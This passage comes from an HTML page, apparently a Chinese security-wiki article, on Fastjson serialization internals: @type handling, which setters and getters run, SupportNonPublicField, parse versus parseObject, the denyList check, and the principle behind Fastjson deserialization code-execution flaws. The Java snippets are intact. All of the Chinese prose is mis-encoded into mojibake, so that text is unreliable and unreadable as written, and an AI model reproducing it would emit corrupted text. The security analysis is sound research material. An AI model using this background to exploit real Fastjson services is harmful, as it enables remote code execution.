<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2_2 <span class="token operator">+</span> <span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// æ–¹æ³•ä¸‰ï¼šè¿”å› Person å¯¹è±¡</span>
<span class="token class-name">Person</span> person3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person3<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person3<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai_3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">String</span> s3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person3<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Person</span> person3_3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>s3<span class="token punctuation">,</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person3_3 <span class="token operator">+</span> <span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410160358-qwvtvlb.cc27f92b.png" alt="image" loading="lazy">â€‹</p><p>ä»ä¸Šå›¾å¯çŸ¥ï¼Œé€šè¿‡ <code>SerializerFeature.WriteClassName</code>â€‹ å¼€å¯è‡ªçœååºåˆ—åŒ–æˆ JSON çš„æ•°æ®å°±ä¼šå¤šä¸€ä¸ª <code>@type</code>â€‹ ç”¨æ¥æŒ‡æ˜ååºåˆ—åŒ–çš„ç›®æ ‡å¯¹è±¡ç±»å‹ï¼Œ<strong>å¹¶ä¸”è°ƒç”¨å…¶</strong> <code>getter/setter/is</code>â€‹ <strong>æ–¹æ³•</strong>ã€‚</p><hr><p><strong>ã€fastjson åºåˆ—åŒ–ç‰¹æ€§ã€‘</strong></p><p>é€šè¿‡è°ƒè¯•å¯ä»¥å‘ç°åœ¨åºåˆ—åŒ–æ—¶ï¼š</p><ul><li>FastJson ä¼šè°ƒç”¨å¯¹åº”æˆå‘˜çš„ <code>get()</code>â€‹ æ–¹æ³•</li><li>è¢« private ä¿®é¥°ä¸”æ²¡æœ‰ get æ–¹æ³•çš„æˆå‘˜ä¸ä¼šè¢«åºåˆ—åŒ–</li><li>è¢« public ä¿®é¥°çš„æˆå‘˜éƒ½ä¼šè¢«åºåˆ—åŒ–ï¼Œå¹¶ä¸”åºåˆ—åŒ–çš„ç»“æœæ˜¯æ ‡å‡†çš„ JSON å­—ç¬¦ä¸²</li></ul><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410161748-kcfguaw.73de6493.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410163734-nlktkpm.f3715b70.png" alt="image" loading="lazy">â€‹</p><h3 id="ååºåˆ—åŒ–" tabindex="-1"><a class="header-anchor" href="#ååºåˆ—åŒ–"><span>ååºåˆ—åŒ–</span></a></h3><ul><li><strong>éè‡ªçœ</strong>ï¼š<code>public static &lt;T&gt; T parseObject(String text, Class clazz)</code>â€‹ï¼Œéœ€è¦åœ¨ <code>JSON.parseObject</code>â€‹ ä¸­ä¼ å…¥ <code>Class clazz</code>â€‹</li><li>**è‡ªçœï¼š**â€‹<code>public static &lt;T&gt; T parseObject(String text)</code>â€‹</li></ul><p>åºåˆ—åŒ–æ—¶ï¼Œstring ç±»å‹ä¼šè°ƒç”¨å…¨éƒ¨çš„ <code>setter</code>â€‹ æ–¹æ³•ï¼Œpublic ä¿®é¥°çš„æˆå‘˜å…¨èµ‹å€¼ï¼Œprivate åˆ™é»˜è®¤èµ‹å€¼å¤±è´¥ä¸º nullï¼Œä½†è¿˜é¢å¤–è°ƒç”¨äº† <code>getProp2_2</code>â€‹ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410165457-fokb9j4.0d220e62.png" alt="image" loading="lazy">â€‹</p><p>â€‹<code>private Properties prop2_2; // private ä¸”æœ‰ get</code>â€‹ï¼Œä¸”éœ€è¦åœ¨ json ä¸­å¯¹å®ƒèµ‹å€¼ getter æ‰ä¼šè¢«é¢å¤–è°ƒç”¨ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410183400-r4dnyic.a4f30ec9.png" alt="image" loading="lazy">â€‹</p><h3 id="feature-supportnonpublicfield" tabindex="-1"><a class="header-anchor" href="#feature-supportnonpublicfield"><span>Feature.SupportNonPublicField</span></a></h3><p>å¯¹äºæ²¡æœ‰ set æ–¹æ³•çš„ private æˆå‘˜ï¼Œååºåˆ—åŒ–æ—¶ä¼ é€’ <code>Feature.SupportNonPublicField</code>â€‹ å³å¯å®Œæˆèµ‹å€¼ã€‚</p><p>å¯ä»¥çœ‹åˆ°æ­£å¸¸æƒ…å†µä¸‹ private å±æ€§æ²¡æœ‰ setter æ–¹æ³•æ˜¯æ— æ³•æ­£å¸¸å®Œæˆèµ‹å€¼çš„ï¼Œpublic çš„å¯ä»¥ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410174921-pl0auel.034b0ccb.png" alt="image" loading="lazy">â€‹</p><p>å¼€å¯ <code>Feature.SupportNonPublicField</code>â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410174955-lxxjvhx.b1a34f38.png" alt="image" loading="lazy">â€‹</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// Feature.SupportNonPublicField</span>
<span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">&quot;{\n&quot;</span> <span class="token operator">+</span>
        <span class="token string">&quot;\t\&quot;name\&quot;:\&quot;zhaocai_4\&quot;,\n&quot;</span> <span class="token operator">+</span>
        <span class="token string">&quot;\t\&quot;age\&quot;:\&quot;21\&quot;,\n&quot;</span> <span class="token operator">+</span>
        <span class="token string">&quot;\t\&quot;id\&quot;:\&quot;888\&quot;,\n&quot;</span> <span class="token operator">+</span>
        <span class="token string">&quot;\t\&quot;account\&quot;:\&quot;bbb\&quot;\n&quot;</span> <span class="token operator">+</span>
        <span class="token string">&quot;}&quot;</span><span class="token punctuation">;</span>

<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Person</span> person_4 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//Person person_4 = JSON.parseObject(jsonString, Person.class);</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person_4 <span class="token operator">+</span> <span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="parse-å’Œ-parseobject-åŒºåˆ«" tabindex="-1"><a class="header-anchor" href="#parse-å’Œ-parseobject-åŒºåˆ«"><span>Parse å’Œ ParseObject åŒºåˆ«</span></a></h3><p>ä¸¤è€…çš„ä¸»è¦åŒºåˆ«å°±æ˜¯ï¼Œ<strong>parseObject</strong> è¿”å›çš„æ˜¯ <strong>JSONObject</strong> ç±»å‹ï¼Œè€Œ <strong>parse</strong> è¿”å›çš„æ˜¯<strong>å®é™…ç±»å‹çš„å¯¹è±¡</strong>ã€‚</p><p>è¿™é‡Œæ˜¯è°ƒç”¨ parseObject è¿”å›å€¼çš„æƒ…å†µï¼Œå®é™… parseObject è°ƒç”¨çš„ä¹Ÿæ˜¯ parse æ–¹æ³•ï¼Œåªä¸è¿‡åœ¨è¿”å›ä¹‹å‰ï¼Œå°†ç›®æ ‡å¯¹è±¡è½¬æ¢ä¸ºäº† JSONObect ç±»å‹ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// parseObject è¿”å›å‰ä¼šå°†å¯¹è±¡è½¬æ¢ä¸º JSONObject ç±»å‹</span>
<span class="token keyword">return</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">JSONObject</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token class-name">JSONObject</span><span class="token punctuation">)</span>obj <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token class-name">JSONObject</span><span class="token punctuation">)</span><span class="token function">toJSON</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>æ‰€ä»¥è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œ<code>parse()</code>â€‹ ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•åŠ<strong>æŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³•</strong>ï¼Œè€Œ parseObject() ç”±äºå¤šæ‰§è¡Œäº† <code>JSON.toJSON(obj)</code>â€‹ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„æ‰€æœ‰ setter å’Œ getter æ–¹æ³•ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç”¨ <code>parse()</code>â€‹ ååºåˆ—åŒ–ä¼šç›´æ¥å¾—åˆ°ç‰¹å®šçš„ç±»ï¼Œè€Œæ— éœ€åƒ <code>parseObject()</code>â€‹ ä¸€æ ·è¿”å›çš„æ˜¯ JSONObject ç±»å‹çš„å¯¹è±¡ã€è¿˜å¯èƒ½éœ€è¦å»è®¾ç½®ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¿”å›ç‰¹å®šçš„ç±»ã€‚</p><h2 id="æ€»ç»“ä¸€" tabindex="-1"><a class="header-anchor" href="#æ€»ç»“ä¸€"><span>æ€»ç»“ä¸€</span></a></h2><p>æ ¹æ®å‡ ç§è¾“å‡ºçš„ç»“æœï¼Œå¯ä»¥å¾—åˆ°æ¯ç§è°ƒç”¨æ–¹å¼çš„ç‰¹ç‚¹ï¼š</p><ul><li><p>â€‹<code>parseObject(String text, Class&lt;T&gt;clazz)</code>â€‹â€‹â€‹â€‹â€‹â€‹ï¼Œæ„é€ æ–¹æ³• + setter + æ»¡è¶³æ¡ä»¶é¢å¤–çš„ getter</p><p><strong>æœ‰ Class ç±»å‹</strong>ï¼šåœ¨æœ‰ Class ç±»å‹æ—¶ï¼Œè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œæ‰€æœ‰å±æ€§çš„ setter æ–¹æ³•ï¼Œproperties å±æ€§çš„ getter æ–¹æ³•ï¼›å®šä¹‰ç±»å‹æ— è®ºæ˜¯ Objectï¼ŒUser è¿”å›ç±»å‹éƒ½æ˜¯ User ç±»å‹ã€‚<strong>ååºåˆ—åŒ–æ—¶æ ¹æ®</strong> <code>@type</code>â€‹â€‹â€‹ <strong>åˆ¶å®šç±»å‹è¿›è¡Œè§£æ</strong>ï¼Œå®šä¹‰äº†å¯¹è±¡çš„ç±»å‹</p></li><li><p>â€‹<code>JSONObject parseObject(String text)</code>â€‹â€‹â€‹â€‹â€‹â€‹ï¼Œæ„é€ æ–¹æ³• + setter + getter + æ»¡è¶³æ¡ä»¶é¢å¤–çš„ getter</p><p><strong>æ—  Class ç±»å‹</strong>ï¼šè¿™ç§æƒ…å†µä¸‹è°ƒç”¨äº†<mark>æ„é€ æ–¹æ³•ï¼Œæ‰€æœ‰å±æ€§çš„ getter æ–¹æ³•ï¼Œéç§æœ‰å±æ€§çš„ setter æ–¹æ³•ï¼Œå…¶ä¸­ properties å±æ€§çš„ getter æ–¹æ³•è°ƒç”¨äº†ä¸¤æ¬¡</mark>ï¼›å®šä¹‰ç±»å‹æ— è®ºæ˜¯ Objectï¼Œè¿˜æ˜¯ JSONObject ç»“æœéƒ½ä¸€æ ·ï¼Œè¿”å›çš„ç±»å‹éƒ½ä¸º JSONObject</p></li><li><p>â€‹<code>parse(String text)</code>â€‹â€‹â€‹â€‹â€‹â€‹ï¼Œæ„é€ æ–¹æ³• + setter + æ»¡è¶³æ¡ä»¶é¢å¤–çš„ getter</p></li><li><p><strong>å…¬æœ‰å±æ€§</strong>æœ‰æ—  getter/setter éƒ½å¯ä»¥ååºåˆ—åŒ–æˆåŠŸ</p></li><li><p><strong>ç§æœ‰å±æ€§</strong>æœ‰ getter/setter ååºåˆ—åŒ–æˆåŠŸï¼Œç§æœ‰å±æ€§æ—  setter ååºåˆ—åŒ–å¤±è´¥</p></li><li><p><strong>è®¾ç½®</strong> <code>Feature.SupportNonPublicField</code>â€‹â€‹ï¼šè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œæ‰€æœ‰å±æ€§çš„ setter æ–¹æ³•ï¼Œproperties å±æ€§çš„ getter æ–¹æ³•ï¼›è¿”å›ç±»å‹éƒ½ä¸º User ç±»å‹ï¼Œå¹¶ä¸”ä¸å«æœ‰ setter çš„ç§æœ‰å±æ€§ä¹Ÿååºåˆ—åŒ–æˆåŠŸ</p></li></ul><h2 id="fastjson-ååºåˆ—åŒ–æµç¨‹" tabindex="-1"><a class="header-anchor" href="#fastjson-ååºåˆ—åŒ–æµç¨‹"><span>Fastjson ååºåˆ—åŒ–æµç¨‹</span></a></h2><h3 id="ååºåˆ—åŒ–ç±»å›¾" tabindex="-1"><a class="header-anchor" href="#ååºåˆ—åŒ–ç±»å›¾"><span>ååºåˆ—åŒ–ç±»å›¾</span></a></h3><p>Fastjson ååºåˆ—åŒ–çš„ç±»æ–¹æ³•è°ƒç”¨å…³ç³»å¦‚å›¾</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240416154806-47p0r3i.52bde09b.png" alt="image" loading="lazy">â€‹</p><ul><li>JSONï¼šé—¨é¢ç±»ï¼Œæä¾›å…¥å£</li><li>DefaultJSONParserï¼šä¸»ç±»</li><li>JSONLexerBaseï¼šå­—ç¬¦åˆ†æç±»</li><li>JavaBeanDeserializerï¼šJavaBean ååºåˆ—åŒ–ç±»</li><li>JSONLexeï¼šå¤„ç† Json åˆ†è¯ï¼Œnext() å¯ä»¥è·å– Json å­—ç¬¦ä¸²çš„ä¸‹ä¸€ä¸ªå­—ç¬¦</li><li>â€‹ParserConfigâ€‹ï¼šåŒ…å«è§£æé…ç½®ï¼Œååºåˆ—åŒ–å™¨ï¼Œæ ‡ç­¾ç­‰å„ç±»é…ç½®ä¿¡æ¯</li><li>JSONScannerï¼šè´Ÿè´£æ‰«æå’Œè·å– json å­—ç¬¦ä¸²ä¸­çš„ Token å¹¶è¿”å›</li><li>ObjectDeserializerï¼šè´Ÿè´£å°† json å­—ç¬¦ä¸²ååºåˆ—åŒ–ï¼Œä¸ JavaBean æœ‰å…³ç³»ï¼Œå†…ç½®å„ç§ç±»å‹çš„ååºåˆ—åŒ–å™¨</li></ul><h3 id="ååºåˆ—åŒ–ç‰¹ç‚¹" tabindex="-1"><a class="header-anchor" href="#ååºåˆ—åŒ–ç‰¹ç‚¹"><span>ååºåˆ—åŒ–ç‰¹ç‚¹</span></a></h3><p>â€‹<code>this.getDeserializer()</code>â€‹ ä¸­ä¸»è¦é€šè¿‡æ¯”å¯¹ type ç±»å‹å¯»æ‰¾åˆé€‚çš„ååºåˆ—åŒ–å™¨ï¼Œå…¶ä¸­æœ‰ä¸€æ¬¡ <code>this.denyList</code>â€‹ é»‘åå•åˆ¤æ–­ï¼Œé»‘åå•ä¸­çš„ç±»å‡ºç°ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p>â€‹<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</code>â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240416171629-nzk32k5.dccd21d3.png" alt="image" loading="lazy">â€‹</p><p>å¯¹ type Class ç±»å‹ï¼ŒClassName è¿›è¡Œä¸€ç³»åˆ—æ¯”å¯¹ï¼Œç”±äºæœªèƒ½åœ¨é¢„è®¾çš„ååºåˆ—åŒ–å™¨ä¸­æ‰¾åˆ°åˆé€‚çš„ï¼Œæ ¹æ® Class ç±»å‹è°ƒç”¨ <code>this.createJavaBeanDeserializer</code>â€‹ åˆ›å»º <code>JavaBeanDeserializer</code>â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240416171855-35uhwzn.04bf2428.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240416171957-gakvpop.d2c3ede3.png" alt="image" loading="lazy">â€‹</p><p>â€‹<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240416172752-1bhttls.2904a3cf.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240416172825-rpzhrgj.9b1686af.png" alt="image" loading="lazy">â€‹</p><p>å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼Œ<strong>Fastjson ä¼šå¯¹æ»¡è¶³ä¸‹åˆ—è¦æ±‚çš„ setter/getter æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼š</strong></p><p>ã€<strong>æ»¡è¶³æ¡ä»¶çš„ setterã€‘</strong></p><ul><li>å‡½æ•°åé•¿åº¦å¤§äº 4 ä¸”ä»¥ set å¼€å¤´</li><li>éé™æ€å‡½æ•°</li><li>è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ª</li></ul><p>ã€<strong>æ»¡è¶³æ¡ä»¶çš„ getterã€‘</strong></p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº 4</li><li>ä»¥ get å¼€å¤´ä¸”ç¬¬ 4 ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>éé™æ€æ–¹æ³•</li><li>æ— å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ª <code>Collection</code>â€‹ æˆ– <code>Map</code>â€‹ æˆ– <code>AtomicBoolean</code>â€‹ æˆ– <code>AtomicInteger</code>â€‹ æˆ– <code>AtomicLong</code>â€‹</li></ul><p>å‰é¢çš„ <code>properties</code>â€‹ ç§æœ‰å±æ€§ï¼Œå…¶ç±»å‹ä¸º Propertiesï¼Œè€Œ Properties æ˜¯ç»§æ‰¿äº Hashtableï¼ŒHashtable æ˜¯å®ç° Map æ¥å£ç±»çš„ç±»ï¼Œå› æ­¤ properties ç§æœ‰å±æ€§çš„ getter æ–¹æ³•æ—¶ç»§æ‰¿è‡ª Mapï¼Œä»è€Œèƒ½å¤ŸæˆåŠŸè¢« Fastjson è°ƒç”¨ã€‚</p><p>æ³¨æ„ï¼Œé™¤äº† getter æ–¹æ³•å’Œ setter æ–¹æ³•å¤–ï¼Œè¿˜æœ‰ä¸ª is æ–¹æ³•è¿™é‡Œæ²¡æœ‰åˆ—ä¸¾ï¼Œå¯è‡ªè¡Œæµ‹è¯•ã€‚</p><ul><li>å­˜æ”¾ key çš„ <code>symbolTable</code>â€‹ æ˜¯ä½•æ—¶è§£æçš„ï¼Ÿ åœ¨ SymbolTable å¯¹è±¡ç”Ÿæˆæ—¶ï¼Œ<code>$ref</code>â€‹ å’Œ <code>@type</code>â€‹ ä¸¤ä¸ªå…³é”®å­—å·²ç»è¢«é¢„è®¾è¿›å»</li><li>å­˜æ”¾ valueâ€‹ â€‹çš„æ–¹æ³•æ˜¯å¦‚ä½•è·å–åˆ°å€¼å¾—ï¼Ÿ é€šè¿‡å¾ªç¯è·å–åˆ°ç›®æ ‡å€¼å¾—å¼€å§‹å’Œç»“æŸç´¢å¼•ä½ç½®ï¼Œé€šè¿‡ <code>subString</code>â€‹ æ–¹æ³•æˆªå–ç›®æ ‡å€¼</li></ul><h3 id="ååºåˆ—åŒ–åŸç†" tabindex="-1"><a class="header-anchor" href="#ååºåˆ—åŒ–åŸç†"><span>ååºåˆ—åŒ–åŸç†</span></a></h3><p>Fastjson æ˜¯è‡ªå·±å®ç°çš„ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œä¸æ˜¯ç”¨çš„ Java åŸç”Ÿçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ã€‚æ— è®ºæ˜¯å“ªä¸ªç‰ˆæœ¬ï¼ŒFastjson ååºåˆ—åŒ–æ¼æ´çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ä¸åŒç‰ˆæœ¬æ˜¯é’ˆå¯¹ä¸åŒçš„é»‘åå•æˆ–è€…åˆ©ç”¨ä¸åŒåˆ©ç”¨é“¾æ¥è¿›è¡Œç»•è¿‡åˆ©ç”¨è€Œå·²ã€‚</p><p>é€šè¿‡ Fastjson ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ¶æ„æ„é€ çš„ JSON å†…å®¹ï¼Œç¨‹åºå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–åå¾—åˆ°æ¶æ„ç±»å¹¶æ‰§è¡Œäº†æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><p><strong>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ</strong></p><p>ç”±å‰é¢ demo çŸ¥é“ï¼ŒFastjson ä½¿ç”¨ <code>parseObject()/parse()</code>â€‹ è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥æŒ‡å®šç±»å‹ã€‚==å¦‚æœæŒ‡å®šçš„ç±»å‹å¤ªå¤§ï¼ŒåŒ…å«å¤ªå¤šå­ç±»ï¼Œå°±æœ‰åˆ©ç”¨ç©ºé—´äº†ã€‚==ä¾‹å¦‚ï¼Œå¦‚æœæŒ‡å®šç±»å‹ä¸º Object æˆ– JSONObjectï¼Œåˆ™å¯ä»¥ååºåˆ—åŒ–å‡ºæ¥ä»»æ„ç±»ã€‚ä¾‹å¦‚ä»£ç å†™ <code>Object o = JSON.parseObject(poc,Object.class)</code>â€‹ å°±å¯ä»¥ååºåˆ—åŒ–å‡º Object ç±»æˆ–å…¶ä»»æ„å­ç±»ï¼Œè€Œ Object åˆæ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œæ‰€ä»¥å°±å¯ä»¥ååºåˆ—åŒ–å‡ºæ‰€æœ‰ç±»ã€‚</p><p><strong>æ¥ç€ï¼Œå¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°å‘¢ï¼Ÿ</strong></p><p>ç”±å‰é¢çŸ¥é“ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå°†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€getter æ–¹æ³•ã€setter æ–¹æ³•æ‰§è¡Œä¸€éï¼Œå¦‚æœè¿™ä¸‰ç§æ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯æ”»å‡»è€…ä¼ å…¥è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»ä¸­çš„æ„é€ å‡½æ•°ã€getter æ–¹æ³•ã€setter æ–¹æ³•ä¸­è¦å­˜åœ¨æ¼æ´æ‰èƒ½è§¦å‘ã€‚</p><p>æˆ‘ä»¬åˆ° <code>DefaultJSONParser.parseObject(Map object, Object fieldName)</code>â€‹ ä¸­çœ‹ä¸‹ï¼ŒJSON ä¸­ä»¥ <code>@type</code>â€‹ å½¢å¼ä¼ å…¥çš„ç±»çš„æ—¶å€™ï¼Œè°ƒç”¨ <code>deserializer.deserialize()</code>â€‹ å¤„ç†è¯¥ç±»ï¼Œå¹¶å»è°ƒç”¨è¿™ä¸ªç±»çš„ setter å’Œ getter æ–¹æ³•ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">T</span> value <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// --&gt;</span>
<span class="token comment">// com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)</span>
<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">&quot;unchecked&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token class-name">Type</span> type<span class="token punctuation">,</span> <span class="token class-name">Object</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> token <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">LITERAL_STRING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">bytesValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> bytes<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

